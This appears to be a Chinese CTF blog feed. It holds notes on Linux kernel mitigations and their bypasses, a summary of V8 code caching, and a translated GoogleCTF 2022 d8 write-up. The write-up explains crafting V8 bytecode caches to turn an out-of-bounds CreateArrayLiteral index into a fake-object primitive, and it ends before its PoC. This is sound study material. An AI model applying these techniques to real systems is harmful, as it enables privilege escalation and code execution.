<h4 id="绕过1-1"><a href="#绕过1-1" class="headerlink" title="绕过1"></a>绕过1</h4><p>修改CR4寄存器<br>把 CR4 寄存器中的第 20 位置为 0 后，我们就可以执行用户态的代码。一般而言，我们会使用 0x6f0 来设置 CR4，这样 SMAP 和 SMEP 都会被关闭。</p>
<p>内核中修改 cr4 的代码最终会调用到 <code>native_write_cr4</code>，当我们能够劫持控制流后，我们可以执行内核中的 gadget 来修改 CR4。从另外一个维度来看，内核中存在固定的修改 cr4 的代码，比如在 <code>refresh_pce</code> 函数、<code>set_tsc_mode</code> 等函数里都有。<br><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/user-code-execution/">https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/user-code-execution/</a><br><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#ret2usr-with-SMAP-SMEP-BYPASS">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#ret2usr-with-SMAP-SMEP-BYPASS</a></p>
<h4 id="绕过2-1"><a href="#绕过2-1" class="headerlink" title="绕过2"></a>绕过2</h4><p>访问Direct Mapping Area<br><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir</a></p>
<h4 id="绕过3-1"><a href="#绕过3-1" class="headerlink" title="绕过3"></a>绕过3</h4><p>copy_from&#x2F;to_user<br>在劫持控制流后，攻击者可以调用 <code>copy_from_user</code> 和 <code>copy_to_user</code> 来访问用户态的内存。这两个函数会临时清空禁止访问用户态内存的标志。<br><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/user-data-access/#copy_fromto_user">https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/user-data-access/#copy_fromto_user</a></p>
<h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>KPTI(Kernel Page Table Isolation)</p>
<h4 id="查看方法-3"><a href="#查看方法-3" class="headerlink" title="查看方法"></a>查看方法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dmesg | grep &#x27;page table&#x27; </span><br><span class="line">[ 0.000000] Kernel/User page tables isolation: enabled </span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo | grep pti </span><br><span class="line">fpu_exception : yes</span><br><span class="line">flags : ... pti smep smap</span><br></pre></td></tr></table></figure>
<h4 id="绕过1-2"><a href="#绕过1-2" class="headerlink" title="绕过1"></a>绕过1</h4><p>swapgs and return to usermode<br><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/kpti/">https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/kpti/</a><br><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81-with-KPTI-bypass">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81-with-KPTI-bypass</a></p>
<h4 id="绕过2-2"><a href="#绕过2-2" class="headerlink" title="绕过2"></a>绕过2</h4><p>signal handler<br>我们也可以考虑在用户态注册 signal handler 来执行位于用户态的代码。在这种方式下，我们无需切换页表。比如注册signal handler捕获段错误，然后执行用户态代码<br><a href="https://blog.csdn.net/u014679440/article/details/131256279">hxp2020 kernel-rop</a></p>
<h3 id="Canary-CONFIG-STACKPROTECTOR"><a href="#Canary-CONFIG-STACKPROTECTOR" class="headerlink" title="Canary (CONFIG_STACKPROTECTOR)"></a>Canary (CONFIG_STACKPROTECTOR)</h3><p>Kernel Canary</p>
<h4 id="查看方法-4"><a href="#查看方法-4" class="headerlink" title="查看方法"></a>查看方法</h4><ol>
<li><code>checksec</code></li>
<li>人工分析二进制文件，看函数中是否有保存和检查 Canary 的代码</li>
</ol>
<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p>可以发现，x86 架构下 Canary 实现的特点是同一个 task 共享 Canary。<br>根据 x86 架构下 Canary 实现的特点，我们只要泄漏了一次系统调用中的 Canary，同一 task 的其它系统调用中的 Canary 也就都被泄漏了。<br>通过漏洞泄漏canary即可<br> <strong>内核中的<code>canary</code>的值通常取自<code>gs</code>段寄存器某个固定偏移处（%gs:40）的值,可以直接绕过</strong></p>
<h3 id="Dmesg-Restrictions"><a href="#Dmesg-Restrictions" class="headerlink" title="Dmesg Restrictions"></a>Dmesg Restrictions</h3><p>通过设置<code>/proc/sys/kernel/dmesg_restrict</code>为1, 可以将<code>dmesg</code>输出的信息视为敏感信息(默认为0)</p>
<h3 id="Kernel-Address-Display-Restriction"><a href="#Kernel-Address-Display-Restriction" class="headerlink" title="Kernel Address Display Restriction"></a>Kernel Address Display Restriction</h3><p>内核提供控制变量 <code>/proc/sys/kernel/kptr_restrict</code> 用于控制内核的一些输出打印。</p>
<ul>
<li><code>kptr_restrict == 2</code> :内核将符号地址打印为全 0 , root 和普通用户都没有权限. </li>
<li><code>kptr_restrict == 1</code> : root 用户有权限读取,普通用户没有权限.</li>
<li><code>kptr_restrict == 0</code> : root 和普通用户都可以读取.<br><a href="https://www.freebuf.com/vuls/397566.html">https://www.freebuf.com/vuls/397566.html</a></li>
</ul>
<h3 id="ro-after-init"><a href="#ro-after-init" class="headerlink" title="__ro_after_init"></a>__ro_after_init</h3><p>Linux 内核中有很多数据都只会在 <code>__init</code> 阶段被初始化，而且之后不会被改变。使用 <code>__ro_after_init</code> 标记的内存，在 init 阶段结束后，不能够被再次修改。<br>例如下面a3博客里在泄漏内核基址时提到的部分，该内容中.realmode_init成员的内容即不能修改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">x86_platform_ops</span> <span class="title">x86_platform</span> __<span class="title">ro_after_init</span> =</span> &#123;  </span><br><span class="line"><span class="comment">/* ... */</span>  </span><br><span class="line">.realmode_init = init_real_mode,  </span><br><span class="line"><span class="comment">/* ... */</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><p>我们可以使用 <code>set_memory_rw(unsigned long addr, int numpages)</code> 来修改对应页的权限。</p>
<h3 id="mmap-min-addr"><a href="#mmap-min-addr" class="headerlink" title="mmap_min_addr"></a>mmap_min_addr</h3><p>mmap_min_addr 是用来对抗 NULL Pointer Dereference 的，指定用户进程通过 mmap 可以使用的最低的虚拟内存地址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/sys/vm/mmap_min_addr</span><br><span class="line">65536</span><br></pre></td></tr></table></figure>

<h2 id="一些Linux的编译config的作用（可能不能绕过）"><a href="#一些Linux的编译config的作用（可能不能绕过）" class="headerlink" title="一些Linux的编译config的作用（可能不能绕过）"></a>一些Linux的编译config的作用（可能不能绕过）</h2><h3 id="CONFIG-SLAB-FREELIST-HARDENED"><a href="#CONFIG-SLAB-FREELIST-HARDENED" class="headerlink" title="CONFIG_SLAB_FREELIST_HARDENED"></a>CONFIG_SLAB_FREELIST_HARDENED</h3><p>堆保护机制，类似与glibc的safe-linking机制，对freelist的指针进行异或加密</p>
<h4 id="查看方法-5"><a href="#查看方法-5" class="headerlink" title="查看方法"></a>查看方法</h4><p>freelist的指针丑不丑</p>
<h4 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h4><p><a href="https://pwn.college/software-exploitation/kernel-exploitation/">https://pwn.college/software-exploitation/kernel-exploitation/</a><br>例题：<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E4%BE%8B%E9%A2%98%EF%BC%9A%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8A%E8%B5%9B-notebook">强网杯2021线上赛 - notebook</a></p>
<h3 id="CONFIG-SLAB-FREELIST-RANDOM"><a href="#CONFIG-SLAB-FREELIST-RANDOM" class="headerlink" title="CONFIG_SLAB_FREELIST_RANDOM"></a>CONFIG_SLAB_FREELIST_RANDOM</h3><p>堆保护机制，定义random_seq，打乱freelist的顺序，但是后续申请释放仍然为LIFO</p>
<h4 id="查看方法-6"><a href="#查看方法-6" class="headerlink" title="查看方法"></a>查看方法</h4><p>多申请几次，查看申请到的堆块后三位偏移是否会变化</p>
<h4 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h4><ul>
<li><p>打乱顺序仅限于申请内存时，后续释放后再申请仍然为LIFO；<br><a href="https://pwn.college/software-exploitation/kernel-exploitation/">https://pwn.college/software-exploitation/kernel-exploitation/</a></p>
</li>
<li><p>使用堆喷方法构造合适的堆布局，从而实现溢出利用等；</p>
</li>
</ul>
<h3 id="CONFIG-HARDENED-USERCOPY"><a href="#CONFIG-HARDENED-USERCOPY" class="headerlink" title="CONFIG_HARDENED_USERCOPY"></a>CONFIG_HARDENED_USERCOPY</h3><p>内存保护机制，copy_from_user()，copy_to_user()<br><a href="https://pwn.college/software-exploitation/kernel-exploitation/">https://pwn.college/software-exploitation/kernel-exploitation/</a></p>
<h3 id="CONFIG-STATIC-USERMODEHELPER"><a href="#CONFIG-STATIC-USERMODEHELPER" class="headerlink" title="CONFIG_STATIC_USERMODEHELPER"></a>CONFIG_STATIC_USERMODEHELPER</h3><p>与<code>modprobe_path</code>, <code>core_pattern</code>相关，如果设置该配置，则在执行call_usermodeprobe_setup()函数时会执行该配置项对应的<code>CONFIG_STATIC_USERMODEHELPER_PATH</code>路径，此时修改modprobe_path虽然还能覆写，但攻击无效。</p>
<h4 id="查看方法-7"><a href="#查看方法-7" class="headerlink" title="查看方法"></a>查看方法</h4><p><a href="https://github.com/smallkirby/kernelpwn/blob/master/important_config/STATIC_USERMODEHELPER.md">https://github.com/smallkirby/kernelpwn/blob/master/important_config/STATIC_USERMODEHELPER.md</a><br><a href="https://www.kernelconfig.io/config_static_usermodehelper">https://www.kernelconfig.io/config_static_usermodehelper</a></p>
<h3 id="CONFIG-MEMCG-KMEM"><a href="#CONFIG-MEMCG-KMEM" class="headerlink" title="CONFIG_MEMCG_KMEM"></a>CONFIG_MEMCG_KMEM</h3><p>GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离<br>開啟 CONFIG_MEMCG_KMEM，且 malloc 時傳入 <code>GFP_KERNEL_ACCOUNT</code>，便會新增另一組 cache <code>kmalloc-cg-x</code> 以隔離重要內容。</p>
<h4 id="绕过-5"><a href="#绕过-5" class="headerlink" title="绕过"></a>绕过</h4><ul>
<li>利用cross-cache攻击内核结构体：sk_buff, pipe_buffer, msg_msg, cred等</li>
</ul>
<h4 id="SLAB-ACCOUNT-flag"><a href="#SLAB-ACCOUNT-flag" class="headerlink" title="SLAB_ACCOUNT flag"></a>SLAB_ACCOUNT flag</h4><p>在使用 <code>kmem_cache_create</code> 创建一个 cache 时，传递了 <code>SLAB_ACCOUNT</code> 标记，那么这个 cache 就会单独存在，不会与其它相同大小的 cache 合并。<br>许多结构体（如 <strong>cred 结构体</strong>）对应的堆块并不单独存在，会和相同大小的堆块使用相同的 cache</p>
<h3 id="CONFIG-RANDOMIZE-KSTACK-OFFSET"><a href="#CONFIG-RANDOMIZE-KSTACK-OFFSET" class="headerlink" title="CONFIG_RANDOMIZE_KSTACK_OFFSET"></a>CONFIG_RANDOMIZE_KSTACK_OFFSET</h3><p>内核栈空间（在pt_regs后）偏移随机化<br>对应内核启动参数：”randomize_kstack_offset&#x3D;on&#x2F;off”</p>
<h4 id="查看方法-8"><a href="#查看方法-8" class="headerlink" title="查看方法"></a>查看方法</h4><h4 id="绕过-6"><a href="#绕过-6" class="headerlink" title="绕过"></a>绕过</h4><p><a href="https://www.kernelconfig.io/config_randomize_kstack_offset?arch=x86&kernelversion=6.15.10">https://www.kernelconfig.io/config_randomize_kstack_offset?arch=x86&amp;kernelversion=6.15.10</a></p>
<h3 id="CONFIG-CFI-CLANG"><a href="#CONFIG-CFI-CLANG" class="headerlink" title="CONFIG_CFI_CLANG"></a>CONFIG_CFI_CLANG</h3><p>对间接函数调用添加了运行时检查</p>
<h4 id="查看方法-9"><a href="#查看方法-9" class="headerlink" title="查看方法"></a>查看方法</h4><h4 id="绕过-7"><a href="#绕过-7" class="headerlink" title="绕过"></a>绕过</h4><p>直接覆写内核调用栈的物理地址构造ROP；<br>USMA<br><a href="https://github.com/arttnba3/D3CTF2023_d3kcache">D3CTF2023_d3kcache</a></p>
<h3 id="CONFIG-BINFMT-MISC"><a href="#CONFIG-BINFMT-MISC" class="headerlink" title="CONFIG_BINFMT_MISC"></a>CONFIG_BINFMT_MISC</h3><h4 id="查看方法-10"><a href="#查看方法-10" class="headerlink" title="查看方法"></a>查看方法</h4><p>是否可以使用modprobe_path提权路径<br>查看是否存在”binfmt-%04”字符串</p>
<h3 id="INIT-ON-ALLOC-DEFAULT-ON-CONFIG-INIT-ON-FREE-DEFAULT-ON"><a href="#INIT-ON-ALLOC-DEFAULT-ON-CONFIG-INIT-ON-FREE-DEFAULT-ON" class="headerlink" title="INIT_ON_ALLOC_DEFAULT_ON &amp;  CONFIG_INIT_ON_FREE_DEFAULT_ON"></a>INIT_ON_ALLOC_DEFAULT_ON &amp;  CONFIG_INIT_ON_FREE_DEFAULT_ON</h3><p>内核启动参数：init_on_alloc&#x3D;1，init_on_free&#x3D;1<br>在分配堆内存时会先对申请&#x2F;释放的内存区域进行清零</p>
<h2 id="其他防护"><a href="#其他防护" class="headerlink" title="其他防护"></a>其他防护</h2><h3 id="sysctl-unprivileged-userfaultfd"><a href="#sysctl-unprivileged-userfaultfd" class="headerlink" title="sysctl_unprivileged_userfaultfd"></a>sysctl_unprivileged_userfaultfd</h3><p>针对userfaultfd的防护机制，在linux-5.11以及以后将其初始化为0，只有root权限才能进行该系统调用。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense">CTF Wiki</a></li>
<li><a href="https://pwn.college/software-exploitation/kernel-exploitation/">pwn.college</a></li>
<li><a href="https://www.kernelconfig.io/">kernelconfig.io</a></li>
<li><a href="https://www.anquanke.com/post/id/238363&quot;">Linux 内核安全机制总结</a></li>
<li><a href="https://github.com/nccgroup/exploit_mitigations/blob/main/linux_mitigations.md">ncc_group linux_mitigations</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Client V8学习</title>
    <url>/posts/fda95e8.html</url>
    <content><![CDATA[<h1 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h1><ul>
<li><a href="https://juejin.cn/post/7077442828388794404">V8-ignition指令</a></li>
<li><a href="2025-07-14-V8%E5%86%85%E5%AD%98%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6.md">V8内存回收机制</a></li>
<li><a href="2025-09-09-Code-caching.md">Code-caching</a></li>
<li><a href="2025-09-09-V8-Hole.md">V8 Hole</a></li>
<li><a href="https://v8.dev/blog/pointer-compression">V8指针压缩</a></li>
<li><a href="2025-09-11-V8-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.md">V8 数据结构</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>V8 Code Caching</title>
    <url>/posts/1afb040e.html</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>v8使用JIT执行JavaScript代码，因此在执行前需要解析并编译，由于每次执行前都需要做此操作的话开销过大，引入code cache来优化（version &gt;&#x3D; 4.2）。<br>script 第一次执行后，会保存其cache data。下一次v8编译相同script时（不同的v8实例也可以使用）则会使用cache data。<br>一个早期版本的code cache功能api测试用例：<a href="https://chromium.googlesource.com/v8/v8.git/+/4.5.56/test/cctest/test-api.cc#21090">testcase</a><br>当v8编译一个script脚本后，可以通过添加<code>v8::ScriptCompiler::kProduceCodeCache</code>选项来生成相应的cache data用于后续的编译。如果编译成功，则会将cache data添加到source object并且可以通过调用<code>v8::ScriptCompiler::Source::GetCacheData</code>获取。</p>
<blockquote>
<p>注：<code>v8::ScriptCompiler::kProduceCodeCache</code>被废弃，新api：<code>v8::ScriptCompiler::GetCodeCache</code></p>
</blockquote>
<p>在后续的编译中，先前生成的cache data可以被添加到source object并添加<code>v8::ScriptCompiler::kConsumeCodeCache</code>选项来启用cache。此时code可以更快执行。<br>v8 6.6版本以后不仅会cache保存top-level代码，而且会保存top-level code执行后产生的代码，即“懒编译”的函数也被涵盖在内。<br>Chrome的Code Cache功能：</p>
<ul>
<li>cold load：第一次加载page，没有cache data</li>
<li>warm load：之前加载过page，存在相应cache（需要在72h内并且script source需要超过1KB）</li>
<li>hot load：page加载过两次，可以使用cached data</li>
</ul>
<h2 id="比较深入的版本"><a href="#比较深入的版本" class="headerlink" title="比较深入的版本"></a>比较深入的版本</h2><p>参考：<a href="https://swarm.ptsecurity.com/how-we-bypassed-bytenode-and-decompiled-node-js-bytecode-in-ghidra/">https://swarm.ptsecurity.com/how-we-bypassed-bytenode-and-decompiled-node-js-bytecode-in-ghidra/</a><br>该文章介绍了对v8 bytecode的ghidra反汇编插件。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://v8.dev/blog/code-caching">Code caching</a></li>
<li><a href="https://github.com/thlorenz/v8-perf/blob/master/snapshots%2Bcode-caching.md">Snapshots and Code Caching</a></li>
<li><a href="https://v8.dev/blog/v8-release-66">Code caching after execution - 2018</a></li>
<li><a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc?l=269&rcl=c59618d0f92b57e4dcfb903f3c99bb0574eac340">V8 ScriptRunner source</a></li>
<li><a href="https://swarm.ptsecurity.com/how-we-bypassed-bytenode-and-decompiled-node-js-bytecode-in-ghidra/">How we bypassed bytenode and decompiled Node.js bytecode in Ghidra</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>GoogleCTF 2022 d8 Write Up</title>
    <url>/posts/dc9665bb.html</url>
    <content><![CDATA[<p>有一位大佬分享了当时的wp思路，网上似乎没找到中文版的wp，在此做翻译记录和学习。</p>
<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>题目目录文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">base ❯ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── build.Dockerfile</span><br><span class="line">├── challenge</span><br><span class="line">├── launcher.py</span><br><span class="line">├── Makefile.txt</span><br><span class="line">├── snapshot_blob.bin</span><br><span class="line">└── v8.patch</span><br><span class="line"></span><br><span class="line">0 directories, 6 files</span><br></pre></td></tr></table></figure>
<p>根据v8.patch文件可知定义了<code>/srv/challenge/runner.cc</code>文件作为题目。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-DEFINE_BOOL(wasm_write_protect_code_memory, true,</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+DEFINE_BOOL(wasm_write_protect_code_memory, false,</span></span><br><span class="line"></span><br><span class="line">             &quot;write protect code memory on the wasm native heap with mprotect&quot;)</span><br></pre></td></tr></table></figure>
<p>主要逻辑为challenge二进制程序接收用户输入（大小不超过65536）binary data到<code>v8::ScriptCompiler::CachedData</code>，后续会调用script-&gt;Run()函数执行目标。即可以利用<code>challenge</code>执行任意 v8 bytecode。由于 v8 对于字节码为信任输入，字节码执行存在很多的越界读原语。最终通过<code>CreateArrayLiteral</code>的越界读来获取到 <code>faked ArrayBoilerplateDescription</code>，从而触发 fake object 原语，然后获取到任意代码执行。</p>
<h2 id="0x01-V8-Code-Caching"><a href="#0x01-V8-Code-Caching" class="headerlink" title="0x01 V8 Code Caching"></a>0x01 V8 Code Caching</h2><p>code-caching相关文档：</p>
<ul>
<li><a href="https://v8.dev/blog/code-caching">Code caching</a></li>
<li><a href="https://github.com/thlorenz/v8-perf/blob/master/snapshots%2Bcode-caching.md">Snapshots and Code Caching</a><br>总结了中文文档：<a href="2025-09-09-Code-caching.md">Code-caching</a><br>该功能是对javascript编译执行的优化。</li>
</ul>
<h3 id="Code-Cache生成"><a href="#Code-Cache生成" class="headerlink" title="Code Cache生成"></a>Code Cache生成</h3><p>根据以上文档，需要使用<code>v8::ScriptCompiler::kProduceCodeCache</code>或者<code>v8::ScriptCompiler::GetCodeCache</code>来产生cache。然而在给定的v8版本中均没有以上api。通过检查<code>test-api.cc</code>文件代码，发现使用了<code>v8::ScriptCompiler::CreateCodeCache</code>来为script生成cache data。需要注意必须在<code>script-&gt;Run(context)</code>后调用<code>CreateCodeCache</code>，否则一些懒编译函数不会生成cache。<br>另外，可以使用<code>v8::V8::SetFlagsFromCommandLine</code>来允许script来使用<code>%DebugPrint</code>等参数，便于调试。需要注意<code>%DebugPrint</code>会被编译进code cache，因此<code>runner.cc</code>中cache执行时，仍然会展示<code>%DebugPrint</code>的内容。<br>另外一个需要注意的点是<code>runner.cc</code>装载cache时，会提供一个空的script string。cache loader会检查binary cache的hash与script的hash是否相同。通过调试发现，空script的hash值为0,并且binary cache的hash位于+8偏移处，占四字节大小。因此如果要允许cache执行需要控制该域为0。</p>
<img src="/posts/dc9665bb/file-20250918094101310.png" class="">
<p>似乎对应的check逻辑：</p>
<img src="/posts/dc9665bb/file-20250918094552381.png" class="">
<h3 id="debug调试"><a href="#debug调试" class="headerlink" title="debug调试"></a>debug调试</h3><p>生成的cache在debug&#x2F;release版本之间是不能共享的。在debug版本，会设置<code>Flag_verify_snapshot_checksum</code>标志位来进行额外的校验和检查，需要手动通过<code>SerializedCodeData::SanityCheckWithoutSource</code>函数来禁用该标志位。</p>
<img src="/posts/dc9665bb/file-20250912175139421.png" class="">
<p>在flag_definitions.h文件中修改该flag定义为false，然后禁用DCHECK以及CSA_CHECK后即可使用DEBUG调试，但后续heap还有type check等检查。<br>通过runner.cc，我们可以提供JavaScript代码生成Code cache。完整代码为：<a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/Google2022/gen.cc">gen.cc</a>。可以使用<code>./gen exp.js --allow-native-syntax --print-bytecode</code>来编译JavaScript进cache并存储二进制cache到.&#x2F;blob.bin。使用<code>--print-bytecode</code>可以看到生成的v8 bytecode，并且这些bytecode可以在生成的cache中查看。</p>
<h2 id="0x02-v8字节码漏洞分析利用"><a href="#0x02-v8字节码漏洞分析利用" class="headerlink" title="0x02 v8字节码漏洞分析利用"></a>0x02 v8字节码漏洞分析利用</h2><p>一开始我们思考的是JIT产生的raw machine code是否也能够保存到cache中，如果可以我们就可以通过修改cache直接执行shellcode。然而经过数次尝试无法实现。因此我们需要使用v8 bytecode来实现攻击。<br>通过任意修改bytecode，v8会直接crash掉。作者想到了三种攻击方式，不过只有最后一个利用成功：</p>
<ol>
<li>使用字节码泄漏JavaScript的<a href="2025-09-09-V8-Map%E5%AF%B9%E8%B1%A1%E5%AD%A6%E4%B9%A0.md">Hole</a>，之前使用过的一个攻击原语。然而在当前版本可能已经被修复了。</li>
<li>v8字节码访问参数寄存器时，在指令字节序列中存在一个索引值字节。通过修改该字节，可以导致OOB。然而通过进一步调查，发现OOB发生在栈上，并且后面的数据不容易控制。另外参数数组不是以压缩指针的形式保存的而是64位指针形式，因此难以简单的通过写入Smi数组到栈上。</li>
<li>我们发现<code>CreateArrayLiteral</code>也有一个索引值可以用于去访问<code>OldSpace</code>的<code>FixedArray</code>对象。该值是指向<code>ArrayBoilerplateDescription</code>的指针，描述了数组的初始化。通过控制<code>FixedArray</code>后面的内容，我们可以伪造<code>ArrayBoilerplateDescription</code>实例，从而获取对象伪造原语。</li>
</ol>
<h3 id="CreateArrayLiteral"><a href="#CreateArrayLiteral" class="headerlink" title="CreateArrayLiteral"></a>CreateArrayLiteral</h3><p><code>CreateArrayLiteral</code>是用于创建JavaScript数组的字节码。<br>gpt给出的解释：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在 V8 的字节码中，`CreateArrayLiteral [0], [0], #4` 是一个字节码指令，用于创建一个数组字面量（Array Literal）。我们需要分析这条指令的含义，特别是第一个 `[0]` 是如何控制指向 `ArrayBoilerplateDescription` 的偏移的。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## **字节码指令解释**</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">### **1. CreateArrayLiteral**</span></span></span><br><span class="line"></span><br><span class="line">- 这是 V8 中的一条字节码指令，用于创建一个数组字面量（`ArrayLiteral`）。</span><br><span class="line">- 它的格式通常是：</span><br><span class="line">    </span><br><span class="line">    `CreateArrayLiteral [index_in_constant_pool], [flags], [length]`</span><br><span class="line">    </span><br><span class="line">    - **`[index_in_constant_pool]`**: 指向常量池（Constant Pool）中的索引，用于获取 `ArrayBoilerplateDescription`。</span><br><span class="line">    - **`[flags]`**: 一些标志位，用于描述数组的特性（如是否为浅拷贝等）。</span><br><span class="line">    - **`[length]`**: 数组的长度。</span><br></pre></td></tr></table></figure>
<p>以下是测试代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">const</span> o = [[], <span class="number">1.1</span>, <span class="number">0x123</span>];</span><br><span class="line">	<span class="keyword">return</span> o[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line"><span class="title function_">readline</span>();</span><br><span class="line"><span class="comment">// ./d8 test.js --print-bytecode</span></span><br></pre></td></tr></table></figure>
<p>foo函数生成字节码如下：</p>
<img src="/posts/dc9665bb/file-20250910091935673.png" class="">
<p><code>CreateArrayLiteral</code>指令负责数组创建。放入数组的元素由[0]控制。该值为用于访问OldSpace的FixedArray的索引。<br>索引0访问了<code>ArrayBoilerplateDescription</code>实例，该实例用于描述数组元素如何初始化。</p>
<img src="/posts/dc9665bb/file-20250910092306118.png" class="">
<p><code>ArrayBoilerplateDescription</code>示例包含了一个<code>constant elements</code>字段指向另一个FixedArray[0]。该<code>FixedArray</code>包含了新创建数组的初始化元素。另外一个有趣的点是第一个元素是另一个<code>ArrayBoilerplateDescription</code>指针而非<code>JSArray</code>指针，不过可以理解：每次创建一个数组时，我们都会新建一个数组实例，而非沿用老的<code>JSArray</code>的引用。<br>主要关注的点是是否可以伪造<code>CreateArrayLiteral</code>对象中的<code>ArrayBoilerplateDescription</code>，从而实现对象伪造原语。通过手动修改<code>constant elements</code>使其指向另外一个已存在的JavaScript对象指针即可。因此只需要关注如何通过<code>CreateArrayLiteral</code>越界读来伪造<code>ArrayBilerplateDescription</code>。</p>
<h3 id="控制FixedArray后的内存"><a href="#控制FixedArray后的内存" class="headerlink" title="控制FixedArray后的内存"></a>控制FixedArray后的内存</h3><p>由于<code>FixedArray</code>位于<code>OldSpace</code>中，需要创建一个存放<code>double</code>元素<code>Array</code>并触发内存回收来将其放入<code>OldSpace</code>，然后要确定其数组元素要位于<code>FixedArray</code>后。然而该元素地址一般距离<code>FixedArray</code>较远。<br>然后我们发现<code>constant elements</code>的内容是接近<code>FixedArray</code>的，但是其位于<code>FixedArray</code>前。然而，如果我们创建另外一个也包含<code>CreatArrayLiteral</code>指令的函数（<strong>需要满足函数声明位于目标函数后</strong>），其<code>constatn elements</code>则会位于目标<code>FixedArray</code>后。另外如果数组只包含<code>double</code>类型，则其<code>constant elements</code>为<code>FixedDoubleArray</code>类型，其表明<code>unboxed double</code>存放在内存中，因此我们可以完全控制FixedArray后的内存内容。</p>
<blockquote>
<p>注：auto box，unbox为Java的语言特性，auto box即将基础数据类型（eg：int, double）自动装箱为Integer，Double对象。unbox则与之相反</p>
</blockquote>
<p>对应的OOB index是通过调试尝试来计算得到的。开始时我们设置<code>unboxed double</code>为<code>AAAA...</code>，然后在<code>gen.cc</code>进程中检查<code>FixedArray</code>后内存。注意我们不能在<code>run.cc</code>中完成以上任务（由于无法打印字节码），但是两个内存布局很相似。然后可以将其作为<code>CreateArrayLiteral</code>的索引值，然后运行.&#x2F;challenge程序。如果发生<code>0x????41414141</code>的crash，则表明发生了OOB。</p>
<img src="/posts/dc9665bb/file-20250910102925509.png" class="">
<p>计算偏移：<code>(0xc0d00190ed0-0xc0d00190d78)/4=0x56</code>，修改生成的cache二进制文件的对应字节码即可，以下为生成字节码的对应<code>CreateArrayLiteral</code>。</p>
<img src="/posts/dc9665bb/file-20250910104605987.png" class="">

<blockquote>
<p>Debug与Release的差异<br>debug版本的challenge会直接reject掉patch的cache（存在额外检查），但是release不会；<br>debug版本与release对应的偏移不同<br>debug版本存在更多堆安全检查机制</p>
</blockquote>
<p>在debug版本调试，发现执行到CreateArrayLiteral函数时其rsi值即ArrayBiolerplateDescription。</p>
<img src="/posts/dc9665bb/file-20250911111254821.png" class="">
<p>PoC如下，偏移为0x55：</p>
